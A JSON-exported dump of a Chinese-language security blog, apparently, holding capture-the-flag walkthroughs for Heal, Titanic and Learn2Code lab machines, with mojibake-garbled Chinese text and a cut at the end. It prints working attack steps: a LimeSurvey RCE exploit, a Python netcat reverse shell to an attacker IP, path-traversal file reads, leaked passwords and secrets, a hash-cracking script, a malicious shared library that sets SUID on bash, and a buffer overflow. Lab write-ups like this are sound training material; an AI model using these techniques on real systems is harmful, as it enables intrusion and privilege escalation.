ç™»å½•æˆåŠŸåå¯ä»¥çœ‹åˆ°æ˜¯limeservey,åœ¨ç½‘ä¸Šä¸€æœèƒ½æœåˆ°å­˜åœ¨ä¸€ä¸ªCVE-2021-44967 1234567891011121314151617181920212223â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp/CVE-2021-44967]â””â”€# python3 exploit.py --url http://take-survey.heal.htb --user ralph --password 147258369 --lhost 10.10.16.37 --lport 8888[+] LimeSurvey - RCE[+] URL: http://take-survey.heal.htb[*] Creating malicious zip file... &gt; Plugin name: wnlhlwwooa[*] Sending login request...[+] Successfully logged in as ralph[*] Uploading malicious plugin...[+] The malicious plugin was successfully uploaded[*] Installing uploaded plugin...[+] The plugin was successfully installed[*] Activating malicious plugin...[+] Malicious plugin was successfully activated[*] Triggering plugin by sending request to http://take-survey.heal.htb/upload/plugins/wnlhlwwooa/php-rev.php[+] Check your netcat listener! 123456789101112â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# nc -lvvp 8888listening on [any] 8888 ...idconnect to [10.10.16.37] from heal.htb [10.10.11.46] 57622Linux heal 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux 15:36:53 up 19:56, 0 users, load average: 0.02, 0.04, 0.04USER TTY FROM LOGIN@ IDLE JCPU PCPU WHATuid=33(www-data) gid=33(www-data) groups=33(www-data)/bin/sh: 0: can&#x27;t access tty; job control turned off$ uid=33(www-data) gid=33(www-data) groups=33(www-data)$ shellå¼¹å‡ºæ¥äº† ææƒron1234567891011121314www-data@heal:/$ find / -perm -u=s 2&gt;/dev/null/usr/bin/newgrp/usr/bin/chsh/usr/bin/passwd/usr/bin/chfn/usr/bin/umount/usr/bin/sudo/usr/bin/fusermount3/usr/bin/mount/usr/bin/gpasswd/usr/bin/su/usr/lib/openssh/ssh-keysign/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/libexec/polkit-agent-helper-1 suidæ²¡æ‰¾åˆ°ä»€ä¹ˆæœ‰ç”¨çš„ä¸œè¥¿ï¼Œè®¡åˆ’ä»»åŠ¡ä¹Ÿæ²¡æœ‰ä¸œè¥¿ï¼Œæ‰¾ä¸€ä¸‹æ•æ„Ÿæ–‡ä»¶ 1æœ€ç»ˆåœ¨/var/www/limesurvey/application/config/config.phpå‘ç°å¯†ç AdmiDi0_pA$$w0rd ç„¶åsshç™»å½•ronè¯•è¯•ï¼Œå‘ç°å¯†ç æ­£ç¡® ææƒroot123ron@heal:~$ sudo -l[sudo] password for ron:Sorry, user ron may not run sudo on heal. sudo -læ²¡æœ‰ä¸œè¥¿ï¼ŒæŸ¥çœ‹æœ¬åœ°çš„ç½‘ç»œ 123456789101112131415161718192021222324ron@heal:/opt$ ss -lntupNetid State Recv-Q Send-Q Local Address:Port Peer Address:Port Processudp UNCONN 0 0 127.0.0.53%lo:53 0.0.0.0:*udp UNCONN 0 0 0.0.0.0:68 0.0.0.0:*udp UNCONN 0 0 127.0.0.1:8301 0.0.0.0:*udp UNCONN 0 0 127.0.0.1:8302 0.0.0.0:*udp UNCONN 0 0 0.0.0.0:51337 0.0.0.0:*udp UNCONN 0 0 127.0.0.1:8600 0.0.0.0:*udp UNCONN 0 0 0.0.0.0:5353 0.0.0.0:*udp UNCONN 0 0 [::]:5353 [::]:*udp UNCONN 0 0 [::]:42256 [::]:*tcp LISTEN 0 244 127.0.0.1:5432 0.0.0.0:*tcp LISTEN 0 1024 127.0.0.1:3001 0.0.0.0:*tcp LISTEN 0 511 127.0.0.1:3000 0.0.0.0:*tcp LISTEN 0 511 0.0.0.0:80 0.0.0.0:*tcp LISTEN 0 4096 127.0.0.53%lo:53 0.0.0.0:*tcp LISTEN 0 128 0.0.0.0:22 0.0.0.0:*tcp LISTEN 0 4096 127.0.0.1:8503 0.0.0.0:*tcp LISTEN 0 4096 127.0.0.1:8500 0.0.0.0:*tcp LISTEN 0 4096 127.0.0.1:8600 0.0.0.0:*tcp LISTEN 0 4096 127.0.0.1:8302 0.0.0.0:*tcp LISTEN 0 4096 127.0.0.1:8301 0.0.0.0:*tcp LISTEN 0 4096 127.0.0.1:8300 0.0.0.0:*tcp LISTEN 0 128 [::]:22 [::]:* å‘ç°æœ‰å¥½å¤šå¼€åœ¨æœ¬åœ°çš„ç«¯å£ï¼Œ3000æ˜¯è·Ÿ80ä¸€æ ·é¡µé¢ï¼Œ8500æœ‰æ–°æœåŠ¡(Consul)ï¼ŒServicesä¹Ÿèƒ½çœ‹å‡º80æ˜¯æ€»å‡ºå£ï¼ŒHealå¯¹åº”æœ¬åœ°3000ï¼ŒAPIå¯¹åº”æœ¬åœ°3001ï¼ŒPostgreSQLå¯¹åº”æœ¬åœ°5432 sshåšä¸ªä»£ç†å°†æµé‡è½¬å‘8500ç«¯å£ 1ssh -L 8500:127.0.0.1:8500 -Nf ron@10.10.11.46 msfå¯ä»¥æœç´¢åˆ°Consulçš„æ¼æ´ 1214 exploit/multi/misc/consul_rexec_exec 2018-08-11 excellent Yes Hashicorp Consul Remote Command Execution via Rexec 15 exploit/multi/misc/consul_service_exec 2018-08-11 excellent Yes Hashicorp Consul Remote Command Execution via Services API 1234use 15show optionsset RHOSTS 127.0.0.1run ç„¶åå°±æ‹¿åˆ°shelläº† 12345meterpreter &gt; shellProcess 48956 created.Channel 1 created.iduid=0(root) gid=0(root) groups=0(root)","categories":[{"name":"HTB","slug":"HTB","permalink":"https://lvzhouhang.xyz/categories/HTB/"}],"tags":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"HTB-Titanic","slug":"HTB-Titanic","date":"2025-05-09T08:43:33.000Z","updated":"2025-05-09T09:39:13.291Z","comments":true,"path":"2025/05/09/HTB-Titanic/","permalink":"https://lvzhouhang.xyz/2025/05/09/HTB-Titanic/","excerpt":"","text":"ä¿¡æ¯æœé›†12345678910111213141516171819202122232425262728293031323334353637383940414243root@kali:~# rustscan -a 10.10.11.55.----. .-. .-. .----..---. .----. .---. .--. .-. .-.| &#123;&#125; &#125;| &#123; &#125; |&#123; &#123;__ &#123;_ _&#125;&#123; &#123;__ / ___&#125; / &#123;&#125; \\ | `| || .-. \\| &#123;_&#125; |.-._&#125; &#125; | | .-._&#125; &#125;\\ &#125;/ /\\ \\| |\\ |`-&#x27; `-&#x27;`-----&#x27;`----&#x27; `-&#x27; `----&#x27; `---&#x27; `-&#x27; `-&#x27;`-&#x27; `-&#x27;The Modern Day Port Scanner.________________________________________: https://discord.gg/GFrQsGy :: https://github.com/RustScan/RustScan : --------------------------------------Nmap? More like slowmap.ğŸ¢[~] The config file is expected to be at &quot;/root/.rustscan.toml&quot;[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers[!] Your file limit is very small, which negatively impacts RustScan&#x27;s speed. Use the Docker image, or up the Ulimit with &#x27;--ulimit 5000&#x27;. Open 10.10.11.55:22Open 10.10.11.55:80[~] Starting Script(s)[&gt;] Script to be run Some(&quot;nmap -vvv -p &#123;&#123;port&#125;&#125; &#123;&#123;ip&#125;&#125;&quot;)[~] Starting Nmap 7.80 ( https://nmap.org ) at 2025-05-09 08:25 UTCInitiating Ping Scan at 08:25Scanning 10.10.11.55 [4 ports]Completed Ping Scan at 08:25, 0.18s elapsed (1 total hosts)Initiating Parallel DNS resolution of 1 host. at 08:25Completed Parallel DNS resolution of 1 host. at 08:25, 0.00s elapsedDNS resolution of 1 IPs took 0.00s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]Initiating SYN Stealth Scan at 08:25Scanning 10.10.11.55 [2 ports]Discovered open port 80/tcp on 10.10.11.55Discovered open port 22/tcp on 10.10.11.55Completed SYN Stealth Scan at 08:25, 0.52s elapsed (2 total ports)Nmap scan report for 10.10.11.55Host is up, received echo-reply ttl 63 (0.26s latency).Scanned at 2025-05-09 08:25:00 UTC for 1sPORT STATE SERVICE REASON22/tcp open ssh syn-ack ttl 6380/tcp open http syn-ack ttl 63Read data files from: /usr/bin/../share/nmapNmap done: 1 IP address (1 host up) scanned in 0.83 seconds Raw packets sent: 6 (240B) | Rcvd: 6 (236B å¼€æ”¾äº†22å’Œ80ç«¯å£ 80ç«¯å£ä¼šè‡ªåŠ¨è·³è½¬titanic.htbåŸŸåï¼Œæ·»åŠ ä¸€ä¸‹host 110.10.11.55 titanic.htb æšä¸¾ä¸€ä¸‹å­åŸŸåå¯ä»¥å‘ç°æœ‰ä¸€ä¸ªdev,åŒæ ·æ·»åŠ è¿›å» 110.10.11.55 titanic.htb dev.titanic.htb 123456789101112131415161718192021222324252627282930313233â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]â””â”€# wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --hw 28 -u &quot;http://10.10.11.55&quot; -H &quot;Host: FUZZ.titanic.htb&quot; /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.********************************************************* Wfuzz 3.1.0 - The Web Fuzzer *********************************************************Target: http://10.10.11.55/Total requests: 220559=====================================================================ID Response Lines Word Chars Payload=====================================================================000000001: 400 10 L 35 W 303 Ch &quot;# directory-list-2.3-medium.txt&quot;000000003: 400 10 L 35 W 303 Ch &quot;# Copyright 2007 James Fisher&quot;000000007: 400 10 L 35 W 303 Ch &quot;# license, visit http://creativecommons.org/licenses/b y-sa/3.0/&quot;000000010: 400 10 L 35 W 303 Ch &quot;#&quot;000000011: 400 10 L 35 W 303 Ch &quot;# Priority ordered case-sensitive list, where entries were found&quot;000000009: 400 10 L 35 W 303 Ch &quot;# Suite 300, San Francisco, California, 94105, USA.&quot;000000005: 400 10 L 35 W 303 Ch &quot;# This work is licensed under the Creative Commons&quot;000000013: 400 10 L 35 W 303 Ch &quot;#&quot;000000008: 400 10 L 35 W 303 Ch &quot;# or send a letter to Creative Commons, 171 Second Str eet,&quot;000000006: 400 10 L 35 W 303 Ch &quot;# Attribution-Share Alike 3.0 License. To view a copy of this&quot;000000012: 400 10 L 35 W 303 Ch &quot;# on at least 2 different hosts&quot;000000002: 400 10 L 35 W 303 Ch &quot;#&quot;000000004: 400 10 L 35 W 303 Ch &quot;#&quot;000000834: 200 275 L 1278 W 13870 Ch &quot;dev&quot; 80ç«¯å£ç‚¹å‡»å³ä¸Šè§’çš„booknowåå¡«å†™å®Œä¿¡æ¯ï¼Œç„¶åæŠ“åŒ…ï¼Œå¯ä»¥å‘ç°ä¸€ä¸ªdownloadçš„ä¸€ä¸ªè·¯ç”±ï¼Œå°†å…¶ä¿®æ”¹æˆ 1/download?ticket=/etc/passwd å‘ç°å¯ä»¥è¿›è¡Œä»»æ„æ–‡ä»¶è¯»å–,å¯ä»¥ç›´æ¥è¯»å–user.txt 1/download?ticket=/home/developer/user.txt Giteaå‰é¢çš„dev.titanic.htbæ˜¯ä¸€ä¸ªgiteaçš„ç½‘ç«™ï¼Œç‰ˆæœ¬æ˜¯1.22.1 ,ç‚¹å‡»å·¦ä¸Šè§’çš„æ¢ç´¢è·³è½¬åˆ°äº†ä¸€ä¸ªä»“åº“ï¼Œç„¶åæœ‰giteaå’Œmysqlçš„docker-compose.ymlæ–‡ä»¶ 12345678910111213141516#giteaversion: &#x27;3&#x27;services: gitea: image: gitea/gitea container_name: gitea ports: - &quot;127.0.0.1:3000:3000&quot; - &quot;127.0.0.1:2222:22&quot; # Optional for SSH access volumes: - /home/developer/gitea/data:/data # Replace with your path environment: - USER_UID=1000 - USER_GID=1000 restart: always 123456789101112131415#mysqlversion: &#x27;3.8&#x27;services: mysql: image: mysql:8.0 container_name: mysql ports: - &quot;127.0.0.1:3306:3306&quot; environment: MYSQL_ROOT_PASSWORD: &#x27;MySQLP@$$w0rd!&#x27; MYSQL_DATABASE: tickets MYSQL_USER: sql_svc MYSQL_PASSWORD: sql_password restart: always å¯ä»¥çŸ¥é“giteaçš„è·¯å¾„å’Œmysqlçš„å¯†ç ï¼Œgiteaçš„é…ç½®æ–‡ä»¶é»˜è®¤åœ¨/etc/gitea/conf/app.iniè¿™é‡Œå¯èƒ½æ˜¯åœ¨/home/developer/gitea/conf/app.iniä¸å¯¹ï¼Œé‚£å°±æ˜¯/home/developer/gitea/data/gitea/conf/app.iniè¿™ä¸‹å¯¹äº† 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899PP_NAME = Gitea: Git with a cup of teaRUN_MODE = prodRUN_USER = gitWORK_PATH = /data/gitea[repository]ROOT = /data/git/repositories[repository.local]LOCAL_COPY_PATH = /data/gitea/tmp/local-repo[repository.upload]TEMP_PATH = /data/gitea/uploads[server]APP_DATA_PATH = /data/giteaDOMAIN = gitea.titanic.htbSSH_DOMAIN = gitea.titanic.htbHTTP_PORT = 3000ROOT_URL = http://gitea.titanic.htb/DISABLE_SSH = falseSSH_PORT = 22SSH_LISTEN_PORT = 22LFS_START_SERVER = trueLFS_JWT_SECRET = OqnUg-uJVK-l7rMN1oaR6oTF348gyr0QtkJt-JpjSO4OFFLINE_MODE = true[database]PATH = /data/gitea/gitea.dbDB_TYPE = sqlite3HOST = localhost:3306NAME = giteaUSER = rootPASSWD = LOG_SQL = falseSCHEMA = SSL_MODE = disable[indexer]ISSUE_INDEXER_PATH = /data/gitea/indexers/issues.bleve[session]PROVIDER_CONFIG = /data/gitea/sessionsPROVIDER = file[picture]AVATAR_UPLOAD_PATH = /data/gitea/avatarsREPOSITORY_AVATAR_UPLOAD_PATH = /data/gitea/repo-avatars[attachment]PATH = /data/gitea/attachments[log]MODE = consoleLEVEL = infoROOT_PATH = /data/gitea/log[security]INSTALL_LOCK = trueSECRET_KEY = REVERSE_PROXY_LIMIT = 1REVERSE_PROXY_TRUSTED_PROXIES = *INTERNAL_TOKEN = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYmYiOjE3MjI1OTUzMzR9.X4rYDGhkWTZKFfnjgES5r2rFRpu_GXTdQ65456XC0X8PASSWORD_HASH_ALGO = pbkdf2[service]DISABLE_REGISTRATION = falseREQUIRE_SIGNIN_VIEW = falseREGISTER_EMAIL_CONFIRM = falseENABLE_NOTIFY_MAIL = falseALLOW_ONLY_EXTERNAL_REGISTRATION = falseENABLE_CAPTCHA = falseDEFAULT_KEEP_EMAIL_PRIVATE = falseDEFAULT_ALLOW_CREATE_ORGANIZATION = trueDEFAULT_ENABLE_TIMETRACKING = trueNO_REPLY_ADDRESS = noreply.localhost[lfs]PATH = /data/git/lfs[mailer]ENABLED = false[openid]ENABLE_OPENID_SIGNIN = trueENABLE_OPENID_SIGNUP = true[cron.update_checker]ENABLED = false[repository.pull-request]DEFAULT_MERGE_STYLE = merge[repository.signing]DEFAULT_TRUST_MODEL = committer[oauth2]JWT_SECRET = FIAOKLQX4SBzvZ9eZnHYLTCiVGoBtkE4y5B7vMjzz3g ç„¶åè¯»å–æ•°æ®åº“æ–‡ä»¶ï¼Œä¸‹è½½ä¸‹æ¥ç”¨navicatæ‰“å¼€ å¯ä»¥æ‹¿åˆ°developerçš„å¯†ç ä¸ºe531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56 ç„¶åç”¨è„šæœ¬è·‘ä¸€ä¸‹å¯†ç  12345678910111213141516171819202122232425262728293031323334import hashlibimport binascii def pbkdf2_hash(password, salt, iterations=50000, dklen=50): hash_value = hashlib.pbkdf2_hmac( &#x27;sha256&#x27;, password.encode(&#x27;utf-8&#x27;), salt, iterations, dklen ) return hash_value def find_matching_password(dictionary_file, target_hash, salt, iterations=50000, dklen=50): target_hash_bytes = binascii.unhexlify(target_hash) with open(dictionary_file, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;) as file: count = 0 for line in file: password = line.strip() hash_value = pbkdf2_hash(password, salt, iterations, dklen) count += 1 print(f&quot;æ­£åœ¨æ£€æŸ¥å¯†ç  &#123;count&#125;: &#123;password&#125;&quot;) if hash_value == target_hash_bytes: print(f&quot;\\nFound password: &#123;password&#125;&quot;) return password print(&quot;Password not found.&quot;) return None salt = binascii.unhexlify(&#x27;8bf3e3452b78544f8bee9400d6936d34&#x27;)target_hash = &#x27;e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56&#x27;dictionary_file = &#x27;/usr/share/wordlists/rockyou.txt&#x27;find_matching_password(dictionary_file, target_hash, salt) å¯ä»¥çˆ†ç ´å‡ºæ¥å¯†ç æ˜¯25282528,sshè¿æ¥ ææƒ123developer@titanic:~$ sudo -l[sudo] password for developer:Sorry, user developer may not run sudo on titanic. sudoæ²¡æœ‰ä¸œè¥¿ 12345678910111213141516171819202122232425262728developer@titanic:~$ find / -perm -u=s 2&gt;/dev/null/snap/core20/2434/usr/bin/chfn/snap/core20/2434/usr/bin/chsh/snap/core20/2434/usr/bin/gpasswd/snap/core20/2434/usr/bin/mount/snap/core20/2434/usr/bin/newgrp/snap/core20/2434/usr/bin/passwd/snap/core20/2434/usr/bin/su/snap/core20/2434/usr/bin/sudo/snap/core20/2434/usr/bin/umount/snap/core20/2434/usr/lib/dbus-1.0/dbus-daemon-launch-helper/snap/core20/2434/usr/lib/openssh/ssh-keysign/snap/snapd/23545/usr/lib/snapd/snap-confine/usr/lib/snapd/snap-confine/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/openssh/ssh-keysign/usr/libexec/polkit-agent-helper-1/usr/bin/chsh/usr/bin/newgrp/usr/bin/su/usr/bin/pkexec/usr/bin/sudo/usr/bin/gpasswd/usr/bin/umount/usr/bin/chfn/usr/bin/passwd/usr/bin/mount/usr/bin/fusermount3 suidä¹Ÿæ²¡ä»€ä¹ˆå¯ä»¥ç”¨çš„ï¼Œåœ¨optä¸‹æœ‰ä¸€ä¸ªshellè„šæœ¬ 1234developer@titanic:/opt/scripts$ cat identify_images.shcd /opt/app/static/assets/imagestruncate -s 0 metadata.logfind /opt/app/static/assets/images/ -type f -name &quot;*.jpg&quot; | xargs /usr/bin/magick identify &gt;&gt; metadata.log 1234567developer@titanic:/opt/scripts$ magick --versionVersion: ImageMagick 7.1.1-35 Q16-HDRI x86_64 1bfce2a62:20240713 https://imagemagick.orgCopyright: (C) 1999 ImageMagick Studio LLCLicense: https://imagemagick.org/script/license.phpFeatures: Cipher DPC HDRI OpenMP(4.5)Delegates (built-in): bzlib djvu fontconfig freetype heic jbig jng jp2 jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlibCompiler: gcc (9.4) ç‰ˆæœ¬å·æ˜¯7.1.1-35ï¼Œç½‘ä¸Šä¸€æœå°±èƒ½æœåˆ°æœ‰æ¼æ´cd è¿›/opt/app/static/assets/images/ ç„¶åè¾“å…¥ 12345678910gcc -x c -shared -fPIC -o ./libxcb.so.1 - &lt;&lt; EOF#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;__attribute__((constructor)) void init()&#123; system(&quot;cp /root/root.txt root.txt; chmod 754 root.txt&quot;); exit(0);&#125;EOF ç­‰ä¸€ä¸‹å°±ä¼šcp root.txtè¿›æ¥ï¼Œæ‹¿shellçš„è¯å°±æ˜¯ 12345678910gcc -x c -shared -fPIC -o ./libxcb.so.1 - &lt;&lt; EOF#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;__attribute__((constructor)) void init()&#123; system(&quot;chmod +s /bin/bash&quot;); exit(0);&#125;EOF ç„¶åbash -på³å¯","categories":[{"name":"HTB","slug":"HTB","permalink":"https://lvzhouhang.xyz/categories/HTB/"}],"tags":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"HackmyVM-Learn2Code","slug":"HackmyVM-Learn2Code","date":"2025-05-08T05:28:40.000Z","updated":"2025-05-08T06:05:33.427Z","comments":true,"path":"2025/05/08/HackmyVM-Learn2Code/","permalink":"https://lvzhouhang.xyz/2025/05/08/HackmyVM-Learn2Code/","excerpt":"","text":"ä¿¡æ¯æœé›†12345678910â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]â””â”€# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.31.1 0a:00:27:00:00:11 (Unknown: locally administered)192.168.31.2 08:00:27:80:63:b8 PCS Systemtechnik GmbH192.168.31.178 08:00:27:7c:36:6c PCS Systemtechnik GmbH3 packets received by filter, 0 packets dropped by kernelEnding arp-scan 1.10.0: 256 hosts scanned in 2.436 seconds (105.09 hosts/sec). 3 responded 123456789101112131415161718192021222324252627282930313233343536373839â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]â””â”€# rustscan -a 192.168.31.178 -r 1-65535.----. .-. .-. .----..---. .----. .---. .--. .-. .-.| &#123;&#125; &#125;| &#123; &#125; |&#123; &#123;__ &#123;_ _&#125;&#123; &#123;__ / ___&#125; / &#123;&#125; \\ | `| || .-. \\| &#123;_&#125; |.-._&#125; &#125; | | .-._&#125; &#125;\\ &#125;/ /\\ \\| |\\ |`-&#x27; `-&#x27;`-----&#x27;`----&#x27; `-&#x27; `----&#x27; `---&#x27; `-&#x27; `-&#x27;`-&#x27; `-&#x27;The Modern Day Port Scanner.________________________________________: http://discord.skerritt.blog :: https://github.com/RustScan/RustScan : --------------------------------------Scanning ports faster than you can say &#x27;SYN ACK&#x27;[~] The config file is expected to be at &quot;/root/.rustscan.toml&quot;[~] File limit higher than batch size. Can increase speed by increasing batch size &#x27;-b 65435&#x27;.Open 192.168.31.178:80[~] Starting Script(s)[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-08 01:29 EDTInitiating ARP Ping Scan at 01:29Scanning 192.168.31.178 [1 port]Completed ARP Ping Scan at 01:29, 0.07s elapsed (1 total hosts)Initiating Parallel DNS resolution of 1 host. at 01:29Completed Parallel DNS resolution of 1 host. at 01:29, 0.05s elapsedDNS resolution of 1 IPs took 0.05s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]Initiating SYN Stealth Scan at 01:29Scanning 192.168.31.178 [1 port]Discovered open port 80/tcp on 192.168.31.178Completed SYN Stealth Scan at 01:29, 0.02s elapsed (1 total ports)Nmap scan report for 192.168.31.178Host is up, received arp-response (0.00031s latency).Scanned at 2025-05-08 01:29:48 EDT for 0sPORT STATE SERVICE REASON80/tcp open http syn-ack ttl 64MAC Address: 08:00:27:7C:36:6C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)Read data files from: /usr/share/nmapNmap done: 1 IP address (1 host up) scanned in 0.26 seconds Raw packets sent: 2 (72B) | Rcvd: 2 (72B) åªå¼€äº†ä¸€ä¸ª80ç«¯å£ 80ç«¯å£æ‰«æä¸€ä¸‹ç›®å½• 12345678910111213141516171819202122232425â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]â””â”€# gobuster dir -u &quot;http://192.168.31.178/&quot; -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .txt,.php,.html===============================================================Gobuster v3.6by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://192.168.31.178/[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.6[+] Extensions: html,txt,php[+] Timeout: 10s===============================================================Starting gobuster in directory enumeration mode===============================================================/.html (Status: 403) [Size: 279]/.php (Status: 403) [Size: 279]/index.php (Status: 200) [Size: 1161]/includes (Status: 301) [Size: 319] [--&gt; http://192.168.31.178/includes/]/todo.txt (Status: 200) [Size: 51]/.html (Status: 403) [Size: 279]/.php (Status: 403) [Size: 279] todo.txt: 12******* Remember to delete the bak files!! ******* ç„¶åincludesæœ‰ç›®å½•ä¾¿åˆ©å¯ä»¥çœ‹åˆ°access.php.bak: 12345678910111213141516&lt;?php require_once &#x27;GoogleAuthenticator.php&#x27;; $ga = new PHPGangsta_GoogleAuthenticator(); $secret = &quot;S4I22IG3KHZIGQCJ&quot;; if ($_POST[&#x27;action&#x27;] == &#x27;check_code&#x27;) &#123; $code = $_POST[&#x27;code&#x27;]; $result = $ga-&gt;verifyCode($secret, $code, 1); if ($result) &#123; include(&#x27;coder.php&#x27;); &#125; else &#123; echo &quot;wrong&quot;; &#125; &#125;?&gt; è¿™ä¸ªéªŒè¯ç æ˜¯é€šè¿‡GoogleAuthenticator.phpæ£€éªŒçš„,è°·æ­Œæœ‰ä¸€ä¸ªè°·æ­Œèº«ä»½éªŒè¯å™¨ï¼Œå°†è¿™ä¸ªå¯†é’¥è¾“å…¥è¿›å»å°±å¯ä»¥å¾—åˆ°éªŒè¯ç ï¼Œè¾“å…¥éªŒè¯ç è¿›å…¥åˆ°è¾“å…¥codeçš„é¡µé¢ï¼Œå¯ä»¥æ‰§è¡Œpythonä»£ç ï¼Œè€Œä¸”é€šè¿‡æŠ¥é”™å¯ä»¥å¾—çŸ¥æ˜¯ç”¨execæ‰§è¡Œçš„ä»£ç  1__import__(&#x27;os&#x27;).system(&#x27;nc -e /bin/bash 192.168.31.129 4444&#x27;) åå¼¹ä¸€ä¸ªshellå›æ¥ ææƒ12345678910111213www-data@Learn2Code:/var/www/html/includes/php$ find / -perm -u=s 2&gt;/dev/null/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/eject/dmcrypt-get-device/usr/lib/openssh/ssh-keysign/usr/bin/chsh/usr/bin/mount/usr/bin/passwd/usr/bin/su/usr/bin/newgrp/usr/bin/umount/usr/bin/gpasswd/usr/bin/MakeMeLearner/usr/bin/chfn æœ‰ä¸€ä¸ªMakeMeLearnerå¾ˆå¯ç–‘ä¸‹è½½ä¸‹æ¥ï¼Œidaæ‰“å¼€ 12345678910111213141516171819202122int __fastcall main(int argc, const char **argv, const char **envp)&#123; char dest[76]; // [rsp+10h] [rbp-50h] BYREF int v5; // [rsp+5Ch] [rbp-4h] if ( argc == 1 ) errx(1, &quot;please specify an argument\\n&quot;, envp); printf(&quot;Change the &#x27;modified&#x27; variable value to &#x27;0x61626364&#x27; to be a learner&quot;); v5 = 0; strcpy(dest, argv[1]); if ( v5 == 1633837924 ) &#123; setuid(0x3E8u); setgid(0x3E8u); system(&quot;/bin/bash&quot;); &#125; else &#123; printf(&quot;Try again, you got 0x%08x\\n&quot;, v5); &#125; return 0;&#125; strcpyå¯ä»¥æ ˆæº¢å‡ºï¼Œdestçš„å¤§å°æ˜¯76è¾“å…¥77ä¸ªaä¼šå‘ç° 1Change the &#x27;modified&#x27; variable value to &#x27;0x61626364&#x27; to be a learnerTry again, you got 0x00000061 å¯ä»¥å‘ç°æº¢å‡ºåˆ°è¿™é‡Œäº†ä»–æƒ³è¦0x61626364,å°±è¾“å…¥dcba,å› ä¸ºä»–æ˜¯å°ç«¯åº 123Change the &#x27;modified&#x27; variable value to &#x27;0x61626364&#x27; to be a learnerTry again, you got 0x00000061&lt;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaadcbalearner@Learn2Code:/var/www/html/includes/php$ è¿™æ ·å°±æ‹¿åˆ°useräº† ææƒROOTlearnerçš„å®¶ç›®å½•æœ‰ä¸€ä¸ªMySecretPasswordVaultï¼Œä¸‹è½½ä¸‹æ¥çœ‹çœ‹ 12345678910111213141516171819202122232425262728; Attributes: bp-based frame; int __fastcall main(int argc, const char **argv, const char **envp)public mainmain proc nearvar_18= qword ptr -18hvar_10= qword ptr -10hvar_8= qword ptr -8; __unwind &#123;push rbpmov rbp, rspsub rsp, 20hlea rax, aNoi98ho ; &quot;NOI98hO&quot;mov [rbp+var_8], raxlea rax, aIhj ; &quot;Ihj&quot;mov [rbp+var_10], raxlea rax, aJj ; &quot;)(Jj&quot;mov [rbp+var_18], raxlea rdi, s ; &quot;If you are a learner, i&#x27;m sure you know&quot;...call _putsmov eax, 0leaveretn; &#125; // starts at 1135main endp 1NOI98hOIhj)(Jj è¿™ä¸ªå°±æ˜¯rootçš„å¯†ç ","categories":[{"name":"HackMyVM","slug":"HackMyVM","permalink":"https://lvzhouhang.xyz/categories/HackMyVM/"}],"tags":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"HackmyVM-Five","slug":"HackmyVM-Five","date":"2025-05-07T05:29:44.000Z","updated":"2025-05-07T05:52:04.742Z","comments":true,"path":"2025/05/07/HackmyVM-Five/","permalink":"https://lvzhouhang.xyz/2025/05/07/HackmyVM-Five/","excerpt":"","text":"ä¿¡æ¯æœé›†12345678910â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp/tmp]â””â”€# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c: 29: ff: 66:80, IPv4: 192.168.31.129Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.31.1 0a: 00:27:00:00:11 (Unknown: locally administered)192.168.31.2 08:00:27: dd: ef: c8 PCS Systemtechnik GmbH192.168.31.177 08:00:27: fe: 58: c8 PCS Systemtechnik GmbH3 packets received by filter, 0 packets dropped by kernelEnding arp-scan 1.10.0: 256 hosts scanned in 